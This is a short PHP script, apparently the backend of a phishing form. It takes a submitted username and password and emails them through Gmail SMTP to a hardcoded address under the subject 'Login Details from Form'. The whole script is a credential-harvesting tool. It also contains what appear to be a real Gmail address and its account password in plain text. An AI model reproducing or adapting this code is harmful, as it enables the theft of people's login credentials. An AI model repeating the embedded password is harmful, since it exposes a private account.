<?php
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'vendor/autoload.php';

$mail = new PHPMailer(true);

try {
    $username = $_POST['u_name'] ?? '';
    $passcode = $_POST['pass'] ?? '';
    
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'patelsoham195@gmail.com'; // Replace with your Gmail address
    $mail->Password = 'Soham@2810'; // Use an app password for Gmail
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;

    $mail->setFrom('your-email@gmail.com', 'Web Form');
    $mail->addAddress('patelsoham195@gmail.com');

    $mail->isHTML(true);
    $mail->Subject = 'Login Details from Form';
    $mail->Body    = "Username: $username <br> Password: $passcode";

    $mail->send();
    echo "Message has been sent";
} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
?>
